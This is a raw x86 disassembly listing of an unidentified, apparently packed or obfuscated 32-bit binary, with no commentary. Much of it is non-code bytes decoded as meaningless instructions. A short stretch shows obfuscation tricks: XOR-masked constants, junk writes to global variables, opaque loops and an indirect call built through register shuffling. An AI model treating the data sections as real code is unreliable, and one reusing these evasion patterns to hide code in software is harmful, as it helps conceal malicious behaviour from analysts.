  4118e3:	fadd   DWORD PTR [esi]
  4118e5:	cmp    eax,0xba279932
  4118ea:	ins    DWORD PTR es:[edi],dx
  4118eb:	int    0xc0
  4118ed:	(bad)  
  4118ef:	cmp    edx,0xffffffa7
  4118f2:	retf   0x54bf
  4118f5:	adc    DWORD PTR [eax+edi*4-0x75421a7e],0xcae89402
  411900:	fwait
  411901:	js     0x411889
  411903:	sbb    al,0xd9
  411905:	stos   DWORD PTR es:[edi],eax
  411906:	xchg   ebx,eax
  411907:	ret    0x5b61
  41190a:	aas    
  41190b:	inc    edx
  41190c:	call   0x3bf5:0x402bb1a1
  411913:	or     DWORD PTR [ecx+0x75],ecx
  411916:	lea    edi,[edx-0x79c7d1e3]
  41191c:	test   DWORD PTR [esi-0x6c],esp
  41191f:	mov    edx,0x5e18e456
  411924:	push   es
  411925:	lock mov ch,0xb2
  411928:	sub    esp,DWORD PTR [ebp-0x6f917ffa]
  41192e:	cmp    al,0x77
  411930:	mov    DWORD PTR [ebx],esp
  411932:	dec    eax
  411933:	in     al,dx
  411934:	into   
  411935:	and    al,0xcf
  411937:	fistp  QWORD PTR [ebx+0xf]
  41193a:	mov    bh,0xde
  41193c:	stc    
  41193d:	hlt    
  41193e:	fld    TBYTE PTR [edx-0x42882215]
  411944:	xchg   esi,edi
  411946:	outs   dx,DWORD PTR ds:[esi]
  411947:	mov    edi,0xf8b556e0
  41194c:	je     0x411955
  41194e:	leave  
  41194f:	jb     0x41196f
  411951:	je     0x411955
  411953:	mov    dh,BYTE PTR ds:0x94fcb744
  411959:	in     eax,dx
  41195a:	call   0xcf05:0xab2c7cff
  411961:	sub    dh,bl
  411963:	pop    eax
  411964:	pop    edx
  411965:	sbb    BYTE PTR [ecx+0xe0220b9],ch
  41196b:	pop    esi
  41196c:	xchg   esp,eax
  41196d:	bound  edi,QWORD PTR [ecx+0x7e]
  411970:	arpl   WORD PTR [ebx-0x17],dx
  411973:	test   eax,0x6d0c7507
  411978:	fidivr DWORD PTR [eax]
  41197a:	test   DWORD PTR [edx-0x1a9f38cd],ecx
  411980:	add    BYTE PTR [edi-0x79],bh
  411983:	xor    al,0xd0
  411985:	cmp    eax,0x2c77ae1b
  41198a:	mov    ds:0xf9bcdc69,al
  41198f:	fwait
  411990:	push   ds
  411991:	ins    DWORD PTR es:[edi],dx
  411992:	jb     0x4119af
  411994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411995:	cdq    
  411996:	retf   0x4495
  411999:	call   0xa66a0647
  41199e:	ja     0x41198a
  4119a0:	das    
  4119a1:	pusha  
  4119a2:	mov    eax,0x73716b2a
  4119a7:	(bad)  [ebp+0x6ab99cb]
  4119ad:	and    DWORD PTR [ebx+edx*2],edx
  4119b0:	add    dh,BYTE PTR [ebx+0x66]
  4119b3:	stos   BYTE PTR es:[edi],al
  4119b4:	test   DWORD PTR [esi],ecx
  4119b6:	ret    0xf8c5
  4119b9:	xchg   esi,eax
  4119ba:	push   0xffffffa8
  4119bc:	das    
  4119bd:	rcr    BYTE PTR [esi+ebx*4-0x8102eb],1
  4119c4:	imul   eax,DWORD PTR [edx+0x3e],0xc814ecdb
  4119cb:	je     0x4119a1
  4119cd:	and    eax,0x2619c0ed
  4119d2:	outs   dx,BYTE PTR ds:[esi]
  4119d3:	push   ecx
  4119d4:	fsubr  QWORD PTR [edx+0x4df2d2eb]
  4119da:	pop    edx
  4119db:	mov    cl,0xe3
  4119dd:	mov    esp,0xf5800ad3
  4119e2:	mov    ch,0xa5
  4119e4:	iret   
  4119e5:	pop    ebp
  4119e6:	fwait
  4119e7:	test   al,0x6c
  4119e9:	sub    dl,BYTE PTR [edi+edx*4]
  4119ec:	jns    0x41199b
  4119ee:	inc    esp
  4119ef:	loop   0x411a58
  4119f1:	add    DWORD PTR [ecx+ebp*4-0x453e8523],esi
  4119f8:	dec    esp
  4119f9:	cmp    bh,dh
  4119fb:	mov    bh,BYTE PTR [edi+0xb144715]
  411a01:	aad    0x14
  411a03:	cmp    ecx,DWORD PTR [edx+0x3b1e7a72]
  411a09:	leave  
  411a0a:	cwde   
  411a0b:	je     0x411a0a
  411a0d:	shr    ebx,0x3c
  411a10:	xlat   BYTE PTR ds:[ebx]
  411a11:	xchg   ebx,eax
  411a12:	mov    ds:0x939f0a08,al
  411a17:	and    BYTE PTR [edx],0xa3
  411a1a:	jecxz  0x4119a6
  411a1c:	and    esi,DWORD PTR [eax-0x22]
  411a1f:	push   DWORD PTR [eax+0x33192b30]
  411a25:	into   
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42aa0b
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42aa0f
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x766d4ab1]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx+0x7dec2a3a],0xffffff81
  411d3c:	push   edx
  411d3d:	push   cs
  411d3e:	add    BYTE PTR [ebp-0x2374826c],0x32
  411d45:	popa   
  411d46:	add    DWORD PTR [eax],edx
  411d48:	(bad)  
  411d49:	mov    ecx,DWORD PTR ds:[edx+0x50]
  411d4d:	pop    ebp
  411d4e:	jl     0x411db0
  411d50:	addr16 mov esi,0x58df23cb
  411d56:	pop    es
  411d57:	es mov dl,0x63
  411d5a:	ret    0x7003
  411d5d:	std    
  411d5e:	fidivr WORD PTR [esi+esi*1+0x12]
  411d62:	frstor [edx-0x45]
  411d65:	lahf   
  411d66:	push   ebx
  411d67:	pusha  
  411d68:	xor    DWORD PTR [ecx-0x2],edi
  411d6b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411d6d:	pop    ebp
  411d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6f:	(bad)  
  411d71:	lahf   
  411d72:	neg    BYTE PTR [ecx+0x5aebb4a9]
  411d78:	les    ebx,FWORD PTR [edi-0x72ec25f6]
  411d7e:	out    dx,eax
  411d7f:	or     BYTE PTR ds:0x3afc7640,0x4f
  411d86:	int    0xd3
  411d88:	mov    edx,0xed76df6e
  411d8d:	sub    BYTE PTR [eax],0x20
  411d90:	call   DWORD PTR [edx+0x21]
  411d93:	add    DWORD PTR [edx],edx
  411d95:	in     al,dx
  411d96:	and    ch,BYTE PTR [eax]
  411d98:	(bad)  [ecx+ecx*8+0x56]
  411d9c:	push   ecx
  411d9d:	in     al,0x69
  411d9f:	lods   al,BYTE PTR ds:[esi]
  411da0:	ja     0x411d74
  411da2:	cli    
  411da3:	cmp    bh,BYTE PTR [esi+0x19]
  411da6:	dec    ebp
  411da7:	sub    edx,eax
  411da9:	jo     0x411df8
  411dab:	clc    
  411dac:	jne    0x411d75
  411dae:	sar    BYTE PTR [eax],0x1c
  411db1:	xchg   DWORD PTR ds:0xe5b78595,edx
  411db7:	hlt    
  411db8:	aas    
  411db9:	mov    al,0x15
  411dbb:	pop    es
  411dbc:	sar    DWORD PTR [edx+0x222cba80],cl
  411dc2:	fisubr WORD PTR [edx+0x7aea4ea4]
  411dc8:	ja     0x411e07
  411dca:	jbe    0x411d69
  411dcc:	jle    0x411dbe
  411dce:	imul   esp,DWORD PTR [edx-0x37548731],0xffffffeb
  411dd5:	and    BYTE PTR [esi+0x5c],dh
  411dd8:	push   es
  411dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dda:	test   bl,cl
  411ddc:	push   ss
  411ddd:	lock pop es
  411ddf:	push   0x2d44cc6a
  411de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411de5:	and    DWORD PTR [esi],ebp
  411de7:	mov    cl,0xa2
  411de9:	inc    ebx
  411dea:	test   BYTE PTR [edx+ebp*8+0x3e],al
  411dee:	dec    edx
  411def:	and    BYTE PTR [ecx-0x21],bh
  411df2:	pop    ss
  411df3:	clc    
  411df4:	sti    
  411df5:	cdq    
  411df6:	jne    0x411e5f
  411df8:	inc    esi
  411df9:	add    BYTE PTR [ecx+0x17],0x82
  411dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dfe:	cmp    eax,0xee637d80
  411e03:	mov    bl,BYTE PTR [esi+0x1e]
  411e06:	cmc    
  411e07:	aas    
  411e08:	xor    eax,DWORD PTR [ebx-0x1b]
  411e0b:	cdq    
  411e0c:	in     eax,dx
  411e0d:	pop    ecx
  411e0e:	sahf   
  411e0f:	lds    esi,FWORD PTR [edx-0x2e]
  411e12:	gs and eax,0x1bbed553
  411e18:	mov    al,0x5f
  411e1a:	stc    
  411e1b:	dec    eax
  411e1c:	into   
  411e1d:	jmp    0xa368:0xabe5f926
  411e24:	pusha  
  411e25:	dec    ebp
  411e26:	cmp    al,0x92
  411e28:	pop    eax
  411e29:	fs in  al,0xe8
  411e2c:	mov    DWORD PTR [eax+eax*2+0x4f],edi
  411e30:	dec    eax
  411e31:	xlat   BYTE PTR ds:[ebx]
  411e32:	push   ebp
  411e33:	mov    esp,0x842c2dff
  411e38:	mov    ds:0x6625c06c,eax
  411e3d:	daa    
  411e3e:	inc    ebp
  411e3f:	repz add ah,dh
  411e42:	iret   
  411e43:	jg     0x411df0
  411e45:	and    BYTE PTR [esi-0x8],ah
  411e48:	lods   eax,DWORD PTR ds:[esi]
  411e49:	sbb    DWORD PTR [eax-0x31f570f2],0xd8d94640
  411e53:	mov    dh,ah
  411e55:	cmp    ah,BYTE PTR [esi-0x7a]
  411e58:	jge    0x411e9a
  411e5a:	ds test al,0x1
  411e5d:	repz jmp 0x628:0x9f4a21b7
  411e65:	push   edx
  411e66:	inc    edx
  411e67:	ret    
  411e68:	xchg   esp,eax
  411e69:	scas   al,BYTE PTR es:[edi]
  411e6a:	stc    
  411e6b:	div    DWORD PTR [ecx-0x33]
  411e6e:	mov    WORD PTR [esi],fs
  411e70:	fcom   st(5)
  411e72:	xchg   ebx,eax
  411e73:	mov    ds:0x4355d50e,eax
  411e78:	test   DWORD PTR [esi-0x24],ebp
  411e7b:	or     BYTE PTR [ebp+0x7c],0x2f
  411e7f:	test   cl,dl
  411e81:	xor    eax,0x96cd413d
  411e86:	rol    DWORD PTR [ecx],0x71
  411e89:	daa    
  411e8a:	cmp    esp,ecx
  411e8c:	in     eax,dx
  411e8d:	or     esp,DWORD PTR [edi+0x2cbfde6c]
  411e93:	push   es
  411e94:	push   es
  411e95:	shl    BYTE PTR [esi],cl
  411e97:	ins    BYTE PTR es:[edi],dx
  411e98:	test   BYTE PTR [edi],0xa4
  411e9b:	lds    ecx,FWORD PTR [edx]
  411e9d:	scas   al,BYTE PTR es:[edi]
  411e9e:	jg     0x411ebd
  411ea0:	mov    dl,0x1b
  411ea2:	mov    bh,0x7b
  411ea4:	in     eax,dx
  411ea5:	arpl   WORD PTR [ecx],dx
  411ea7:	scas   eax,DWORD PTR es:[edi]
  411ea8:	movzx  eax,WORD PTR [edi+0x4e04c000]
  411eaf:	cmp    al,dl
  411eb1:	xchg   esp,eax
  411eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb4:	fs cdq 
  411eb6:	repnz adc DWORD PTR [edx-0x1f],ebp
  411eba:	mov    dl,0x40
  411ebc:	adc    al,0xf8
  411ebe:	mov    edi,0x98500eb3
  411ec3:	push   edi
  411ec4:	adc    al,0xae
  411ec6:	mov    dl,0x75
  411ec8:	les    ecx,FWORD PTR [esi]
  411eca:	(bad)
  411ecd:	add    ah,BYTE PTR [ebx+0x39]
  411ed0:	vpunpcklqdq xmm0,xmm5,XMMWORD PTR [ecx-0xa58d230]
  411ed8:	je     0x411eca
  411eda:	jmp    0xd3b66eba
  411edf:	xchg   ebp,eax
  411ee0:	cli    
  411ee1:	sti    
  411ee2:	dec    esi
  411ee3:	mov    DWORD PTR [esi],ebx
  411ee5:	inc    eax
  411ee6:	xchg   ch,ch
  411ee8:	data16 je 0x411f1c
  411eeb:	adc    eax,0xedb359e7
  411ef0:	pop    esi
  411ef1:	jns    0x411edf
  411ef3:	cld    
  411ef4:	cmp    BYTE PTR [edi-0x21010295],bh
  411efa:	fbld   TBYTE PTR [edi]
  411efc:	pop    esi
  411efd:	cmp    BYTE PTR [ebx],0x50
  411f00:	ds mov bh,0x6c
  411f03:	ds sbb edx,esi
  411f06:	daa    
  411f07:	test   al,0x68
  411f09:	cmp    eax,DWORD PTR [eax]
  411f0b:	test   DWORD PTR [ecx],edx
  411f0d:	in     al,0x63
  411f0f:	repnz scas eax,DWORD PTR es:[edi]
  411f11:	pop    edx
  411f12:	inc    ebp
  411f13:	clc    
  411f14:	pusha  
  411f15:	imul   ecx,DWORD PTR [edx-0x692491d9],0x21
  411f1c:	pop    edi
  411f1d:	ja     0x411f8d
  411f1f:	fld    st(5)
  411f21:	out    0xdd,eax
  411f23:	rol    BYTE PTR [edi+0x54],1
  411f26:	inc    eax
  411f27:	rcr    DWORD PTR [edx-0x79],cl
  411f2a:	mov    eax,0x672eb23c
  411f2f:	shl    DWORD PTR [esi+0x42],0xd1
  411f33:	jmp    0x5ce7:0x9258f5c4
  411f3a:	mov    esi,0x21f659f7
  411f3f:	sbb    BYTE PTR [edx],cl
  411f41:	inc    ecx
  411f42:	pop    ebp
  411f43:	cdq    
  411f44:	adc    eax,DWORD PTR [ecx-0x4df3f0fa]
  411f4a:	inc    edx
  411f4b:	inc    ebp
  411f4c:	mov    bh,0xf5
  411f4e:	test   BYTE PTR [esi+0x4a],dh
  411f51:	cmp    DWORD PTR [ebp+0x746fc14e],esp
  411f57:	jnp    0x411fa0
  411f59:	sbb    al,0x5c
  411f5b:	mov    ch,ah
  411f5d:	jp     0x411fbf
  411f5f:	or     edx,DWORD PTR [ecx+0x1be22cc1]
  411f65:	lock je 0x411fe1
  411f68:	ins    BYTE PTR es:[edi],dx
  411f69:	cmp    edx,0xffffff8a
  411f6c:	inc    esi
  411f6d:	xchg   esp,eax
  411f6e:	outs   dx,DWORD PTR ds:[esi]
  411f6f:	jae    0x411f7b
  411f71:	pop    ebp
  411f72:	retf   0x317a
  411f75:	(bad)
  411f78:	mov    WORD PTR [edi+ebx*2-0x68],fs
  411f7c:	aad    0xdc
  411f7e:	clc    
  411f7f:	pop    edi
  411f80:	stos   BYTE PTR es:[edi],al
  411f81:	jno    0x411f5c
  411f83:	shr    DWORD PTR [ebp-0x47],1
  411f86:	mov    ecx,0x9caffad9
  411f8b:	icebp  
  411f8c:	lea    edx,[edx]
  411f8e:	cmp    DWORD PTR [esi-0x60],esi
  411f91:	push   edx
  411f92:	mov    ebp,0x66e32ade
  411f97:	lock clc 
  411f99:	scas   eax,DWORD PTR es:[edi]
  411f9a:	push   esp
  411f9b:	fs pop es
  411f9d:	xor    ch,BYTE PTR [ebx+eiz*4]
  411fa0:	hlt    
  411fa1:	adc    eax,0x6c9e193d
  411fa6:	sti    
  411fa7:	lds    ebx,FWORD PTR [ebx-0x4a6b64a8]
  411fad:	and    DWORD PTR [ecx+edx*2],ebx
  411fb0:	shl    BYTE PTR [esi-0x36],0x63
  411fb4:	jmp    0xb928:0xa63f8d8b
  411fbb:	sbb    esp,esp
  411fbd:	or     al,0x60
  411fbf:	sub    eax,0x3e59d846
  411fc4:	(bad)  
  411fc5:	test   DWORD PTR [esi],0xc93aff3
  411fcb:	and    eax,0x2422a2fb
  411fd0:	sbb    BYTE PTR [edx],ah
  411fd2:	dec    ebp
  411fd3:	mov    ds:0xf08832bd,al
  411fd8:	sbb    DWORD PTR [edi+0x3ea96028],edi
  411fde:	pushf  
  411fdf:	xchg   edi,eax
  411fe0:	dec    esp
  411fe1:	xor    eax,0xf8cdd84e
  411fe6:	fmul   QWORD PTR [ebx-0x49]
  411fe9:	sub    bh,cl
  411feb:	and    al,0x7b
  411fed:	fucom  st(6)
  411fef:	in     eax,dx
  411ff0:	shl    bl,0x15
  411ff3:	fsubrp st(2),st
  411ff5:	jns    0x411f7f
  411ff7:	(bad)  
  411ff9:	mov    ds:0x73e38dea,al
  411ffe:	(bad)  
  411fff:	scas   eax,DWORD PTR es:[edi]
  412000:	daa    
  412001:	popa   
  412002:	sub    esp,ecx
  412004:	dec    si
  412006:	xchg   ebp,eax
  412007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412008:	and    BYTE PTR [ebp-0x4e3c9ab6],al
  41200e:	loope  0x41206f
  412010:	or     DWORD PTR [ebx],eax
  412012:	(bad)  [esi-0x55]
  412015:	adc    DWORD PTR [edi-0x10],0xbacc3947
  41201c:	xchg   ecx,eax
  41201d:	push   eax
  41201e:	push   cs
  41201f:	sub    cl,BYTE PTR [ecx+0x42]
  412022:	or     ch,dl
  412024:	pop    ebp
  412025:	sub    DWORD PTR [esi+edi*8],esp
  412028:	mov    dl,0xfa
  41202a:	push   ss
  41202b:	ffreep st(7)
  41202d:	inc    ebp
  41202e:	mov    BYTE PTR [ebx+0x5058d262],cl
  412034:	inc    edi
  412035:	rol    BYTE PTR [ebx+0x44e57290],0xc7
  41203c:	cwde   
  41203d:	bound  edx,QWORD PTR [ebx+0x38326de4]
  412043:	das    
  412044:	xor    eax,0x57dd2226
  412049:	mov    edx,0x960c3dc
  41204e:	and    edx,ecx
  412050:	call   0x41dd:0xd8e0dbdb
  412057:	fs repnz sub ch,al
  41205b:	ss inc ebp
  41205d:	jmp    0x41209f
  41205f:	sbb    al,BYTE PTR [edx-0x43]
  412062:	sbb    eax,0x44ffff0b
  412067:	jge    0x4120e2
  412069:	inc    ecx
  41206a:	pop    ebx
  41206b:	mov    esp,0x65ab75a6
  412070:	xchg   ecx,eax
  412071:	mov    BYTE PTR [ebx],dl
  412073:	js     0x4120c2
  412075:	aas    
  412076:	fiadd  WORD PTR [eax-0x789932c3]
  41207c:	loopne 0x412042
  41207e:	call   0x9c011bb8
  412083:	scas   al,BYTE PTR es:[edi]
  412084:	mov    cl,0x37
  412086:	rol    BYTE PTR [ebx+0x1cad0461],1
  41208c:	int3   
  41208d:	xchg   ecx,eax
  41208e:	ret    
  41208f:	and    eax,0xd1546285
  412094:	cmp    DWORD PTR [ebx],esp
  412096:	imul   esp,DWORD PTR [ebx],0x74
  412099:	icebp  
  41209a:	out    dx,eax
  41209b:	sub    BYTE PTR ds:0xa570c984,dh
  4120a1:	jmp    0x412101
  4120a3:	out    0xcd,eax
  4120a5:	xor    ah,BYTE PTR [esi]
  4120a7:	ret    
  4120a8:	or     ebp,ecx
  4120aa:	sbb    DWORD PTR [ebp+0x1b5d6594],esi
  4120b0:	jbe    0x4120d3
  4120b2:	imul   edi,DWORD PTR fs:[edx-0x63],0x904889ef
  4120ba:	jg     0x41213a
  4120bc:	inc    ebx
  4120bd:	nop
  4120be:	add    DWORD PTR [edx-0x57],0xe9ca88e
  4120c5:	not    BYTE PTR [esi-0x28b57b73]
  4120cb:	fsub   st(4),st
  4120cd:	pop    edi
  4120ce:	(bad)  
  4120cf:	ins    BYTE PTR es:[edi],dx
  4120d0:	add    BYTE PTR [eax+0x53],0x74
  4120d4:	gs dec ecx
  4120d6:	neg    esi
  4120d8:	in     eax,0x13
  4120da:	push   es
  4120db:	js     0x4120b9
  4120dd:	into   
  4120de:	xchg   edx,eax
  4120df:	or     al,0x5e
  4120e1:	call   0xcb884766
  4120e6:	mov    bl,0x2a
  4120e8:	mov    al,0xa9
  4120ea:	in     eax,dx
  4120eb:	or     DWORD PTR [eax],ecx
  4120ed:	pop    edi
  4120ee:	fisttp DWORD PTR [edx+0x68]
  4120f1:	mov    dh,dl
  4120f3:	jnp    0x4120ba
  4120f5:	xor    esi,DWORD PTR [edi+0x2ba7d286]
  4120fb:	out    dx,al
  4120fc:	stos   BYTE PTR es:[edi],al
  4120fd:	xchg   ecx,eax
  4120fe:	clc    
  4120ff:	xor    edx,DWORD PTR [ecx-0x7d]
  412102:	addr16 xor al,0x8d
  412105:	leave  
  412106:	jmp    0x412173
  412108:	hlt    
  412109:	stos   DWORD PTR es:[edi],eax
  41210a:	mov    ebp,0x7f282d56
  41210f:	not    DWORD PTR [edi]
  412111:	xchg   ebp,eax
  412112:	stc    
  412113:	dec    esi
  412114:	and    DWORD PTR [esi+0x6b71bbc0],0xffffffec
  41211b:	(bad)  
  41211d:	rcl    BYTE PTR [edx-0x16],cl
  412120:	ror    DWORD PTR [ebp+edi*8+0x5463d81f],1
  412127:	pop    ecx
  412128:	or     cl,BYTE PTR [edi]
  41212a:	into   
  41212b:	pop    es
  41212c:	sahf   
  41212d:	xor    BYTE PTR [edx],ah
  41212f:	aas    
  412130:	sub    DWORD PTR [esi+edi*8+0x50],ebp
  412134:	std    
  412135:	in     al,dx
  412136:	mov    dh,0xdf
  412138:	loopne 0x4120f6
  41213a:	sbb    DWORD PTR [esi-0x6],ebx
  41213d:	add    al,0xde
  41213f:	loop   0x4120ef
  412141:	inc    edi
  412142:	jnp    0x41210f
  412144:	mov    esi,esi
  412146:	dec    edi
  412147:	mov    cl,0x69
